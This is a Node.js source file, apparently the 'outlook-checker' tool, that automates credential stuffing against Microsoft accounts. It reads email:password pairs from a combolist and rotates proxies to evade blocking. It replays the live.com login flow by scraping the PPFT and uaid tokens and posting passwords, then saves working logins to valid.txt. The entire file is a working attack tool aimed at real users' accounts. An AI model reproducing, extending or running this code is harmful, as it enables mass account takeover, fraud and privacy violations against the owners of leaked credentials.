const { login_header_1, login_header_1_2 } = require('./utils/headers.js');
const { get_sections } = require('./utils/separator.js');
const { prompt_user, remove_line } = require('./utils/utils.js');
const request = require('request');
const { URL } = require('url');
const fs = require('fs');
const { Log } = require('./utils/logger.js');
const { format } = require('date-fns');

let proxy_type;
let proxy_check;
let inbox_filter;
let valid_proxies = 0;
let invalid_proxies = 0;

try {
    const config = require('./config.js');
    thread_num = config.threads;
    proxy_type = config.proxy_type.toLowerCase();
    proxy_check = config.proxy_check;
    inbox_filter = config.inbox_filter;
} catch (error) {
    Log.Error("Config file malformed: download the source code again from: https://github.com/etherialdev/outlook-checker")
}


function first(callback, proxy, cookiejar) {
    const options ={
        method: "GET",
        headers: login_header_1(),
        jar: cookiejar,
        proxy: `${proxy_type}://${proxy}`
    }
    try {
        request('https://login.live.com/login.srf', options, (err, res, body) => {
            if (err) {
                callback(['failed', err, 'failed', 'failed', 'failed', err]);
            } else{
                try {
                    const contextIdRegex = /value="([^"]+)"/;
                    const ppftMatch = body.match(contextIdRegex);
                    const PPFT = ppftMatch[1];
                    const postUrlRegex = /urlPostMsa:'([^']+)'/;
                    const postUrlMatch = body.match(postUrlRegex);
                    const postUrl = postUrlMatch[1];
                    const parsedUrl = new URL(postUrl);
                    const queryParams = Object.fromEntries(parsedUrl.searchParams);
                    const contextid = queryParams.contextid;
                    const opid = queryParams.opid;
                    const uaid = queryParams.uaid;
                    callback(['success', body, PPFT, postUrl, uaid, contextid, opid]);
                } catch (error) {
                    callback(['failed', error, 'failed', 'failed', 'failed', 'failed', 'failed']);
                }
            }
    
        })   
    } catch (error) {
        callback(['failed', error, 'failed', 'failed', 'failed', 'failed', 'failed']);
    }
}

function second(callback, mail_full, opid, uaid, ppft, proxy, cookiejar) {
    const options = {
        method: "POST",
        headers: login_header_1(),
        jar: cookiejar,
        proxy: `${proxy_type}://${proxy}`,
        body: JSON.stringify({
            'username': mail_full,
            'uaid': uaid,
            'isOtherIdpSupported': false,
            'checkPhones': true,
            'isRemoteNGCSupported': true,
            'isCookieBannerShown': false,
            'isFidoSupported': true,
            'forceotclogin': false,
            'otclogindisallowed': false,
            'isExternalFederationDisallowed': false,
            'isRemoteConnectSupported': false,
            'federationFlags': 3,
            'isSignup': false,
            'flowToken': ppft,
        })
    }

    try {
        request(`https://login.live.com/GetCredentialType.srf`, options, (err, res, body) => {
            if (err) {
                callback(['failed', err]);
            }else{
                if (body.includes('ErrorHR')) {
                    callback(['failed', body]);
                }else{
                    callback(['success', body]);
                }
            }
        })
    } catch (error) {
        callback(['failed', error]);
    }

}



function third(callback, mail_full, account_password, opid, post_url, uaid, ppft, proxy, cookiejar) {
    const options = {
        method: "POST",
        headers: login_header_1_2(),
        jar: cookiejar,
        proxy: `${proxy_type}://${proxy}`,
        followRedirect: true,
        form: {
            'i13': '0',
            'login': mail_full,
            'loginfmt': mail_full,
            'type': '11',
            'LoginOptions': '3',
            'lrt': '',
            'lrtPartition': '',
            'hisRegion': '',
            'hisScaleUnit': '',
            'passwd': account_password,
            'ps': '2',
            'psRNGCDefaultType': '',
            'psRNGCEntropy': '',
            'psRNGCSLK': '',
            'canary': '',
            'ctx': '',
            'hpgrequestid': '',
            'PPFT': ppft,
            'PPSX': 'Passpo',
            'NewUser': '1',
            'FoundMSAs': '',
            'fspost': '0',
            'i21': '0',
            'CookieDisclosure': '0',
            'IsFidoSupported': '1',
            'isSignupPost': '0',
            'isRecoveryAttemptPost': '0',
            'i19': '10751',
        }
    }

    try {
        request(post_url, options, (err, res, body) => {
            if (err) {
                callback(['failed', err]);
            }else{
                if (body.includes('correlation_id')) {
                    callback(['miracle', body]);
                }else if (body.includes('sSigninName')){
                    callback(['success', body]);
                }else{
                    callback(['failed', body]);
                }
            }
        })
    } catch (error) {
        callback(['failed', error]);
    }

}

async function process_element(element) {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve();
        }, 500); 
    });
}

async function worker(mail_full, account_password, proxy, cookiejar) {
    return new Promise((resolve, reject) => { 
      first((first_result) => {
        const [first_status, first_response, ppft, post_url, uaid, contextid, opid] = first_result;
  
        if (first_status !== "failed") {
          second((second_result) => {
            const [second_status, second_response] = second_result;
            if (second_status !== "failed") {
              third((third_result) => {
                const [third_status, third_response] = third_result;
                if (third_status === "miracle") {
                    Log.Success("MIRACLE HAPPENED: RESPONSE SAVED TO TXT");
                    fs.writeFileSync("miracle.txt", third_response, "utf8");
                    resolve(["miracle"]); 
                } else if (third_status === "success") {
                    Log.Success(`Valid account: ${mail_full}:${account_password}`);
                    fs.appendFileSync("output/valid.txt",`${mail_full}:${account_password}\n`,"utf8");
                    resolve(["success"]); 
                } else {
                    Log.Error(`Invalid account: ${mail_full}:${account_password}`);
                    fs.appendFileSync("output/invalid.txt",`${mail_full}:${account_password}\n`,"utf8");
                    resolve(["failed"]); 
                }
              }, mail_full, account_password, opid, post_url, uaid, ppft, proxy, cookiejar
              );
            } else {
                Log.Warning(`Failed to execute second request: ${mail_full}:${account_password}`);
                resolve(["retry"]); 
            }
          }, mail_full, opid, uaid, ppft, proxy, cookiejar
          );
        } else {
            Log.Warning(`Failed to execute first request: ${mail_full}:${account_password}`);
            resolve(["retry"]); 
        }
      }, proxy, cookiejar);
    });
  }


async function start(section, section_number, proxies) {
    for (let index = 0; index < section.length; index++) {
        const data_line = section[index];
        const parts = data_line.split(':');
        const email = parts[0].trim();
        const password = parts[1].trim()

        await process_element(data_line);
        let retry_count = 0;

        while (retry_count <= 5) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const cookiejar = request.jar();
            const status = await worker(email, password, proxy, cookiejar);
            if (status !== "retry") {
                break;
            }
            retry_count++;
        }

        if (retry_count > 5) {
            fs.appendFileSync('output/failed_check.txt', `${email}:${password}\n`, 'utf8');
        }

    }
}
 

async function check_config(callback) {
    const errors = [];
    if (fs.existsSync("./config.js")) {
        if (!['http', 'socks4', 'socks5'].includes(proxy_type)) {
            errors.push('proxy_type_error');
        }
        
        if (typeof proxy_check !== 'boolean') {
            errors.push('proxy_check_error');
        }
    
        if (!Number.isInteger(thread_num)) {
            errors.push('thread_num_error');
        }

        if (inbox_filter.every(item => item === "")) {
            errors.push('inbox_filter_empty');
        }
    } else {
        errors.push('config_file_missing');
    }
    if (errors.length > 0) {
        callback(errors);
    }
}

function process_proxy(proxy) {
    return new Promise((resolve, reject) => {
        const options = {
            method: "GET",
            proxy: `${proxy_type}://${proxy}`
        }
        try {
            request('https://httpbin.org/ip', options, (err, res, body) => {
                if (err) {
                    resolve(['failed', err]);
                } else{
                    resolve(['success', 'success']);
                }
        
            })   
        } catch (error) {
            resolve(['failed', error]);
        } 
    });
}

async function check_proxy(section) {
    for (let index = 0; index < section.length; index++) {
        const proxy = section[index];
        const [proxy_status, proxy_response] = await process_proxy(proxy);
        if (proxy_status != "failed") {
            valid_proxies++;
        }else{
            remove_line('input/proxies.txt', proxy)
            invalid_proxies++;
        }
    }
}

async function main() {
    if (proxy_type != "undefined" & proxy_check != "undefined" & inbox_filter != "undefined" & thread_num != "undefined") {

        const is_empty = file => fs.statSync(file).size > 0;
        if (is_empty('input/proxies.txt')) {
            const error_statuses = {
                proxy_type_error: false,
                proxy_check_error: false,
                inbox_filter_empty: false,
                config_file_missing: false,
                thread_num_error: false
            };
            await new Promise((resolve) => {
                check_config((errors) => {
                    for (const error of Object.keys(error_statuses)) {
                        error_statuses[error] = errors.includes(error);
                    }
                    if (error_statuses.config_file_missing) {
                        Log.Error("Config file missing, download the source code again from: https://github.com/etherialdev/outlook-checker");
                    }
                    if (error_statuses.proxy_type_error) {
                        Log.Error("Wrong proxy type, please check the config.js file! (supported proxy types: HTTP, SOCKS4, SOCKS5)");
                    }
                    if (error_statuses.proxy_check_error) {
                        Log.Error("Wrong proxy_check value: it should be true or false, please check the config.js file!");
                    }
                    if (error_statuses.inbox_filter_empty) {
                        Log.Warning("The inbox_filter in the config.js file was empty, input the site domains if you want to save the hits!");
                    }
                    if (error_statuses.thread_num_error) {
                        Log.Error("The thread_num in the config file is not a number, please enter a number.");
                    }
                    resolve();
                });
            });
            
            if (!error_statuses.proxy_type_error && !error_statuses.proxy_check_error && !error_statuses.config_file_missing) {
                const proxy_path = 'input/proxies.txt';
                const proxy_data = fs.readFileSync(proxy_path, 'utf8');
                const proxies = proxy_data.split('\n');
    
    
                if (proxy_check) {
                    Log.info("Checking proxies...");
                    const proxy_sections = await get_sections('input/proxies.txt', 250);
                    const length = Object.keys(proxy_sections).length;
                    let proxy_num = "1";
                    
                    const promises = [];
                    
                    for (let index = 0; index < length; index++) {
                        const proxy_section = proxy_sections[`section_${proxy_num}`];
                        promises.push(check_proxy(proxy_section));
                        proxy_num++;
                    }
                    await Promise.all(promises);
                    
                    console.log(`[\x1b[34m${format(new Date(), 'HH:mm:ss')}\x1b[0m] \x1b[32m(+)\x1b[0m Checked ${proxies.length} proxies!`)
                    console.log(`[\x1b[34m${format(new Date(), 'HH:mm:ss')}\x1b[0m] \x1b[31m(-)\x1b[0m Removed ${invalid_proxies} proxies from proxies.txt!`)
                }
                
                const sections = await get_sections('input/combolist.txt', thread_num);
                let section_num = "1";
                for (let index = 0; index < thread_num; index++) {
                    const section = sections[`section_${section_num}`];
                    start(section, index, proxies);
                    section_num++;
                }
                 
     
            }      
        }else{
            Log.Error(`The proxies.txt is empty, please input your proxies. format: username:password@hostname:port`);
        }
    }else{
        Log.Error("There are an issue with the config file, please check it!")
    }
}
  
main()
